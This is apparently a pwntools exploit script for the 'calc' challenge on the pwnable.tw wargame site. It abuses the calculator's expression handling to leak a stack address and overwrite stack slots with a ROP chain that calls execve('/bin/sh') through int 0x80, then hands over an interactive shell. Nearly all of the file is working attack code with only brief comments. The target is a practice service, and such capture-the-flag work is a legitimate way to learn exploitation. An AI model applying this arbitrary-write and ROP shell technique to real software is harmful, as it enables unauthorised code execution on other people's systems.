from pwn import *  # Import pwntools
import numpy as np
####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './calc'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = '' #ELF('/lib/x86_64-linux-gnu/libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('chall.pwnable.tw',10100) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b *main')



##########################
##### OFFSET FINDER ######
##########################



#########################
#### Finf LIBC offset ###
#########################

def get_addr(offset):
	P.clean()
	P.sendline(b'+' + str(offset).encode())
	recv = np.int32(P.recvline().strip())
	log.info(f'offset {offset}: ' + hex(recv))
	return recv

def change_addr(offset, value):
	base = get_addr(offset)
	P.clean()
	if (base != 0):
		if (base > 0):
			base_payload = b'-' + str(base).encode()
		else:
			base_payload = str(base).replace('-','+')
			base_payload = base_payload.encode()
		payload1 = b'+' + str(offset).encode() + base_payload
		print(payload1)
		P.sendline(payload1)
		P.recvline()
	if (value != 0):
		if (value > 0):
			value_payload = b'+' + str(value).encode()
		else:
			value_payload = str(value).encode()
		payload2 = b'+' + str(offset).encode() + value_payload
		print(payload2)
		P.sendline(payload2)
		P.recvline()

def leak_stack():
	P.clean()
	P.sendline(b'+360')
	ebp = np.int32(P.recvline().strip())
	ebp = ebp -0x20
	return ebp



#####################
#### Find Gadgets ###
#####################

POP_EAX = (ROP_LOADED.find_gadget(['pop eax', 'ret']))[0] 
POP_EDX_ECX_EBX = 0x080701d0
log.info('pop eax ; ret  gadget: ' + hex(POP_EAX))
SYSCALL = (ROP_LOADED.find_gadget(['int 0x80']))[0] 



##############################
##### FINAL EXPLOITATION #####
##############################

ebp = leak_stack()
log.info('ebp : ' + hex(ebp))


change_addr(361,np.int32(POP_EAX))
change_addr(362,np.int32(0xb))
change_addr(363,np.int32(POP_EDX_ECX_EBX))
change_addr(364,np.int32(ebp+0x4*10))
change_addr(365,np.int32(ebp+0x4*10))
change_addr(366,np.int32(ebp+0x4*8))
change_addr(367,np.int32(SYSCALL))
change_addr(368,np.int32(0x6e69622f))
change_addr(369,np.int32(0x0068732f))
change_addr(370,np.int32(0))

P.interactive() #Interact with your shell :)
